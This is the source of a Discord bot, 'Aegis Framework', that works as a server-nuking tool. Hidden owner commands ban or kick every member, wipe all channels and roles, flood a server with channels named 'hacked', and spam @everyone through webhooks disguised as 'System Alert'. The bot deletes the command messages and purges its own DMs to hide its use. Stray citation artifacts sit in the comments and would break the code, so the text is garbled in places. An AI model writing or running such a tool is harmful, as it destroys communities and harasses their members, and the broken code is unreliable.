require('dotenv').config();
const { Client, GatewayIntentBits, Partials, EmbedBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
const handleInteraction = require('./handler'); 

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message, Partials.User]
});

const ownerId = process.env.OWNER_ID;
let currentTargetId = null;
let stopLoops = false;

client.on('ready', () => console.log(`[SYSTEM] Aegis Framework active as ${client.user.tag}`));

// FIXED: Slash Command Listener (Restores the 95% missing commands)
client.on('interactionCreate', async (i) => {
    if (i.isChatInputCommand()) await handleInteraction(i);
});

// Master Console Logic
client.on('messageCreate', async (msg) => {
    if (msg.author.id !== ownerId || msg.author.bot) return;
    const isDM = msg.channel.type === ChannelType.DM;

    if (!isDM && (msg.content.startsWith('!') || msg.content.startsWith('?'))) {
        msg.delete().catch(() => {});
    }

    const args = msg.content.slice(1).trim().split(/ +/);
    const cmd = args.shift()?.toLowerCase();
    const owner = await client.users.fetch(ownerId);

    if (!isDM) currentTargetId = msg.guild.id;
    if (cmd === 'target') {
        currentTargetId = args[0];
        return owner.send(`🎯 **Node Targeted:** \`${currentTargetId}\``);
    }

    if (cmd === 'help') {
        const help = new EmbedBuilder()
            .setColor("#2f3136")
            .setTitle("🔱 AEGIS MASTER CONSOLE")
            .setDescription("`!target [ID]` | `?id` | `?admin [Name]` | `?unban me` | `?spam [count] [msg]` | `?webhookspam` | `?banall` | `?kickall` | `?deletechannels` | `?createchannels [count] [name]` | `?deleteroles` | `?cleardm` | `?stop` ")
            .setFooter({ text: "Authorized Personnel Only" });
        return owner.send({ embeds: [help] }).catch(() => {});
    }

    if (cmd === 'id') {
        const list = client.guilds.cache.map(g => `🏠 ${g.name} | ID: \`${g.id}\``).join('\n');
        return owner.send(`📜 **Active Nodes:**\n${list || "None"}`);
    }

    const targetGuild = client.guilds.cache.get(currentTargetId);
    if (!targetGuild && !['cleardm', 'id', 'help', 'target'].includes(cmd)) return;

    try {
        [cite_start]// MASS DESTRUCTION [cite: 76-80]
        if (cmd === 'deletechannels') {
            await owner.send("☣️ **Wiping Channels...**");
            targetGuild.channels.cache.forEach(c => c.delete().catch(() => {}));
        }
        if (cmd === 'banall') {
            await owner.send("☣️ **Mass Revocation Started...**");
            const members = await targetGuild.members.fetch();
            members.forEach(m => { if (m.bannable && m.id !== ownerId) m.ban().catch(() => {}); });
        }
        if (cmd === 'kickall') {
            await owner.send("☣️ **Mass Ejection Started...**");
            const members = await targetGuild.members.fetch();
            members.forEach(m => { if (m.kickable && m.id !== ownerId) m.kick().catch(() => {}); });
        }
        if (cmd === 'deleteroles') {
            await owner.send("☣️ **Wiping Roles...**");
            targetGuild.roles.cache.forEach(r => { if(r.editable) r.delete().catch(() => {}); });
        }

        [cite_start]// MASS CREATION & SPAM [cite: 81-84]
        if (cmd === 'createchannels') {
            const count = parseInt(args[0]) || 50;
            const name = args.slice(1).join('-') || "hacked";
            await owner.send(`🛠️ **Deploying ${count} Channels...**`);
            for(let i=0; i<count; i++) { 
                if (stopLoops) break; 
                await targetGuild.channels.create({ name, type: ChannelType.GuildText }).catch(() => {}); 
            }
        }
        if (cmd === 'webhookspam') {
            await owner.send("🚀 **Webhook Saturation Underway...**");
            targetGuild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(async (chan) => {
                const hook = await chan.createWebhook({ name: 'System Alert' }).catch(() => {});
                if (hook) { 
                    for(let i=0; i<30; i++) { 
                        if (stopLoops) break; 
                        await hook.send(args.join(' ') || "@everyone").catch(() => {}); 
                    } 
                }
            });
        }

        [cite_start]// UTILITY [cite: 85-88]
        if (cmd === 'cleardm') {
            const dm = await owner.createDM();
            const msgs = await dm.messages.fetch({ limit: 100 });
            msgs.filter(m => m.author.id === client.user.id).forEach(m => m.delete().catch(() => {}));
            await owner.send("扫 **DM Logs Purged.**");
        }
        if (cmd === 'stop') {
            stopLoops = true;
            await owner.send("🛑 **Operational Halt.**");
            setTimeout(() => { stopLoops = false; }, 2000);
        }
    } catch (err) { await owner.send(`⚠️ **Critical Error:** ${err.message}`); }
});

client.login(process.env.TOKEN);
